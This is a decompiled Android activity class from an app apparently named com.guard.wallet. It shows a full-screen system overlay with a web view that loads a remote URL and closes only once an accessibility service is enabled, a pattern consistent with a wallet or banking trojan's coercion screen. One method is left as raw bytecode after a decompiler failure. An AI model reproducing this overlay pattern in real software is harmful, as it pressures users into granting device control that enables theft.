package com.guard.wallet.activity;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.b;
import e0.e;
import java.lang.ref.WeakReference;

public class GuideActivity extends Activity {
   public WeakReference a;

   public final void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.requestWindowFeature(1);
      this.getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
      this.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
      LinearLayout var3 = new LinearLayout(this);
      LayoutParams var2 = new LayoutParams();
      var2.width = -1;
      var2.height = -1;
      this.setContentView(var3, var2);
      this.a = new WeakReference<>(new e(this, true));
      var2 = new LayoutParams();
      var2.width = -1;
      var2.height = -1;
      var3.addView((View)this.a.get(), var2);
      LayoutParams var4 = this.getWindow().getAttributes();
      var4.type = 2038;
      this.getWindow().setAttributes(var4);
      b.d(this);
   }

   public final void onDestroy() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc "GuideActivity"
      // 02: ldc "GuideActivity onDestroy"
      // 04: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 07: pop
      // 08: aload 0
      // 09: getfield com/guard/wallet/activity/GuideActivity.a Ljava/lang/ref/WeakReference;
      // 0c: astore 1
      // 0d: aload 1
      // 0e: ifnull 2a
      // 11: aload 1
      // 12: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 15: ifnull 2a
      // 18: aload 0
      // 19: getfield com/guard/wallet/activity/GuideActivity.a Ljava/lang/ref/WeakReference;
      // 1c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 1f: checkcast e0/e
      // 22: invokevirtual e0/e.destroy ()V
      // 25: aload 0
      // 26: aconst_null
      // 27: putfield com/guard/wallet/activity/GuideActivity.a Ljava/lang/ref/WeakReference;
      // 2a: getstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 2d: ifnull 67
      // 30: getstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 33: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 36: ifnull 67
      // 39: ldc android/app/Activity
      // 3b: monitorenter
      // 3c: getstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 3f: ifnull 5b
      // 42: getstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 45: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 48: ifnull 5b
      // 4b: getstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 4e: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 51: instanceof com/guard/wallet/activity/GuideActivity
      // 54: ifeq 5b
      // 57: aconst_null
      // 58: putstatic com/guard/wallet/utils/b.c Ljava/lang/ref/WeakReference;
      // 5b: ldc android/app/Activity
      // 5d: monitorexit
      // 5e: goto 67
      // 61: astore 1
      // 62: ldc android/app/Activity
      // 64: monitorexit
      // 65: aload 1
      // 66: athrow
      // 67: aload 0
      // 68: invokespecial android/app/Activity.onDestroy ()V
      // 6b: return
   }

   public final boolean onKeyDown(int var1, KeyEvent var2) {
      return false;
   }

   public final void onPause() {
      super.onPause();
      WeakReference var1 = this.a;
      if (var1 != null && var1.get() != null) {
         ((e)this.a.get()).onPause();
      }
   }

   public final void onResume() {
      super.onResume();
      Log.d("GuideActivity", "GuideActivity onResume");
      b.d(this);
      WeakReference var1 = this.a;
      if (var1 != null && var1.get() != null) {
         ((e)this.a.get()).onResume();
         ((e)this.a.get()).loadUrl(b.c());
         b.f();
      }

      if (MyAccessibilityService.P() != null) {
         b.b();
         this.finish();
      }
   }

   public final void onStart() {
      super.onStart();
   }
}
